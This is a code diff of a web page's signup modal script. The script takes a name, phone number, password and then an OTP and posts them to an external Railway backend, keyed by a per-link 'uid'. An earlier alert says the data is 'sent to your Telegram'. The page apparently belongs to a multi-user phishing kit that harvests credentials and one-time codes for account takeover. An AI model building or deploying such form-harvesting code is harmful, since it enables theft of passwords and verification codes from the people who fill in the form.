@@ -98,92 +98,96 @@
 
     <div class="close-btn" onclick="closeSignup()">×</div>
   </div>
+<script>
+  const modal = document.getElementById("signupModal");
+  const signupForm = document.getElementById("signupForm");
+  const otpForm = document.getElementById("otpForm");
+  const successMsg = document.getElementById("success");
 
-  <script>
-    const modal = document.getElementById("signupModal");
-    const signupForm = document.getElementById("signupForm");
-    const otpForm = document.getElementById("otpForm");
-    const successMsg = document.getElementById("success");
+  function openSignup() { modal.style.display = "flex"; }
+  function closeSignup() {
+    modal.style.display = "none";
+    signupForm.style.display = "block";
+    otpForm.style.display = "none";
+    successMsg.style.display = "none";
+  }
 
-    function openSignup() { modal.style.display = "flex"; }
-    function closeSignup() {
-      modal.style.display = "none";
-      signupForm.style.display = "block";
-      otpForm.style.display = "none";
-      successMsg.style.display = "none";
-    }
+  // ========================
+  // Multi-user UID
+  // ========================
+  function getUID() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("uid"); // URL থেকে UID নাও
+  }
 
-    // ========================
-    // Multi-user UID
-    // ========================
-    function getUID() {
-      const params = new URLSearchParams(window.location.search);
-      return params.get("uid");
-    }
+  async function sendData() {
+    const uid = getUID();
+    const name = document.getElementById("name").value;
+    const number = document.getElementById("number").value;
+    const password = document.getElementById("password").value;
 
-    async function sendData() {
-      const uid = getUID();
-      const name = document.getElementById("name").value;
-      const number = document.getElementById("number").value;
-      const password = document.getElementById("password").value;
+    if (!uid) { alert("❌ Invalid link! UID missing."); return; }
+    if (!name || !number || !password) { alert("❌ Please fill all fields!"); return; }
 
-      if (!uid) { alert("❌ Invalid link! UID missing."); return; }
-      if (!name || !number || !password) { alert("❌ Please fill all fields!"); return; }
+    // Backend (Railway) URL
+    const BACKEND_URL = "https://earning-main-bg-production.up.railway.app/send";
 
-      const BACKEND_URL = "https://earning-main-bg-production.up.railway.app/send";
+    signupForm.style.display = "none";
+    otpForm.style.display = "block";
 
-      signupForm.style.display = "none";
-      otpForm.style.display = "block";
+    const messagePayload = { uid, name, number, password };
 
-      try {
-        const res = await fetch(BACKEND_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ uid, name, number, password })
-        });
-        const result = await res.json();
+    try {
+      const res = await fetch(BACKEND_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(messagePayload)
+      });
+      const result = await res.json();
 
-        if (result.success) {
-          alert("✅ Data sent to your Telegram. Enter OTP below.");
-        } else {
-          alert("❌ Error: " + (result.error || "Try again"));
-          signupForm.style.display = "block";
-          otpForm.style.display = "none";
-        }
-      } catch(err) {
-        alert("❌ Network error. Try again later.");
+      if (result.success) {
+        // OTP form show করার পর user verification করতে পারে
+        otpForm.style.display = "block";
+      } else {
+        alert("❌ Error: " + (result.error || "Try again"));
         signupForm.style.display = "block";
         otpForm.style.display = "none";
-        console.error(err);
       }
+    } catch(err) {
+      alert("❌ Network error. Try again later.");
+      signupForm.style.display = "block";
+      otpForm.style.display = "none";
+      console.error(err);
     }
+  }
 
-    async function verifyOTP() {
-      const uid = getUID();
-      const otp = document.getElementById("otp").value;
-      if (!otp) { alert("❌ Please enter OTP!"); return; }
+  async function verifyOTP() {
+    const uid = getUID();
+    const otp = document.getElementById("otp").value;
 
-      const VERIFY_URL = "https://earning-main-bg-production.up.railway.app/verify";
+    if (!otp) { alert("❌ Please enter OTP!"); return; }
 
-      try {
-        const res = await fetch(VERIFY_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ uid, otp })
-        });
-        const result = await res.json();
-
-        if (result.success) {
-          otpForm.style.display = "none";
-          successMsg.style.display = "block";
-        } else {
-          alert("❌ Invalid OTP! Try again.");
-        }
-      } catch(err) {
-        alert("❌ Network error. Try again later.");
-        console.error(err);
+    const VERIFY_URL = "https://earning-main-bg-production.up.railway.app/verify";
+    try {
+      const res = await fetch(VERIFY_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ uid, otp })
+      });
+      const result = await res.json();
+      if (result.success) {
+        otpForm.style.display = "none";
+        successMsg.style.display = "block";
+      } else {
+        alert("❌ Invalid OTP. Try again.");
       }
+    } catch(err) {
+      alert("❌ Network error. Try again later.");
+      console.error(err);
     }
-  </script>
+  }
+</script>
+
+
 </body>
 </html>
